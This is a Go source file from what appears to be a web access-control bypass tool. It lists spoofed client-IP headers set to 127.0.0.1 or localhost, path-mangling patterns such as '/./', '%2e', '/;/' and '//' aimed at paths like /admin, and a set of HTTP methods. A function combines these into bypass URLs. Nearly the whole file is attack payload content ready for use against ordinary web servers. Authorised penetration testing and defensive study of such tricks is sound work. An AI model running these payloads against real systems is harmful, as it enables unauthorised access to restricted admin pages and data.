package bypass

import (
	"fmt"
	"strings"
)

var BypassHeaders = []map[string][]string{
	{"Client-IP": {"127.0.0.1"}},
	{"Forwarded-For-Ip": {"127.0.0.1"}},
	{"Forwarded-For": {"127.0.0.1"}},
	{"Forwarded-For": {"localhost"}},
	{"Forwarded": {"127.0.0.1"}},
	{"Forwarded": {"localhost"}},
	{"True-Client-IP": {"127.0.0.1"}},
	{"X-Client-IP": {"127.0.0.1"}},
	{"X-Custom-IP-Authorization": {"127.0.0.1"}},
	{"X-Forward-For": {"127.0.0.1"}},
	{"X-Forward": {"127.0.0.1"}},
	{"X-Forward": {"localhost"}},
	{"X-Forwarded-By": {"127.0.0.1"}},
	{"X-Forwarded-By": {"localhost"}},
	{"X-Forwarded-For-Original": {"127.0.0.1"}},
	{"X-Forwarded-For-Original": {"localhost"}},
	{"X-Forwarded-For": {"127.0.0.1"}},
	{"X-Forwarded-For": {"localhost"}},
	{"X-Forwarded-Server": {"127.0.0.1"}},
	{"X-Forwarded-Server": {"localhost"}},
	{"X-Forwarded": {"127.0.0.1"}},
	{"X-Forwarded": {"localhost"}},
	{"X-Forwared-Host": {"127.0.0.1"}},
	{"X-Forwared-Host": {"localhost"}},
	{"X-Host": {"127.0.0.1"}},
	{"X-Host": {"localhost"}},
	{"X-HTTP-Host-Override": {"127.0.0.1"}},
	{"X-Originating-IP": {"127.0.0.1"}},
	{"X-Real-IP": {"127.0.0.1"}},
	{"X-Remote-Addr": {"127.0.0.1"}},
	{"X-Remote-Addr": {"localhost"}},
	{"X-Remote-IP": {"127.0.0.1"}},
	{"Redirect": {"127.0.0.1"}},
	{"Referer": {"127.0.0.1"}},
	{"X-Forwarded-Host": {"127.0.0.1"}},
	{"X-Forwarded-Port": {"80"}},
	{"X-True-IP": {"127.0.0.1"}},
}

var PathBypassPatterns = []string{
	"%s/./%s",      // https://example.com/./admin
	"%s/../%s",     // https://example.com/../admin
	"%s/%%2e/%s",   // https://example.com/%2e/admin
	"%s/%s/",       // https://example.com/admin/
	"%s/%s%%20/",   // https://example.com/admin%20/
	"%s/;/%s",      // https://example.com/;/admin
	"%s/.;/%s",     // https://example.com/.;/admin
	"%s//;//%s",    // https://example.com//;//admin
	"%s//%s//",     // https://example.com//admin//
	"%s/%s.json",   // https://example.com/admin.json
	"%s/./%s/..",   // https://example.com/./admin/..
	"%s/*%s",       // https://example.com/*admin/
	"%s/%s*",       // https://example.com/admin/*
	"%s/%%2f%s",    // https://example.com/%2fadmin/
	"%s%%2f%s%%2f", // https://example.com%2fadmin%2f
	"%s//%s/./",    // https://example.com//admin/./
	"%s///%s///",   // https://example.com///admin///
	"%s/%s/;/",     // https://example.com/;/admin/
	"%s//;//%s",    // https://example.com//;//admin/
}

var HttpMethods = [9]string{
	"GET",
	"POST",
	"PUT",
	"PATCH",
	"DELETE",
	"HEAD",
	"OPTIONS",
	"CONNECT",
	"TRACE",
}

func GenerateBypassPaths(url string, path string) []string {

	var bypassPaths []string

	bypassPaths = append(bypassPaths, fmt.Sprintf("%s/%s", url, strings.ToUpper(path)))

	for _, pattern := range PathBypassPatterns {
		bypassPaths = append(bypassPaths, fmt.Sprintf(pattern, url, path))
	}
	return bypassPaths
}
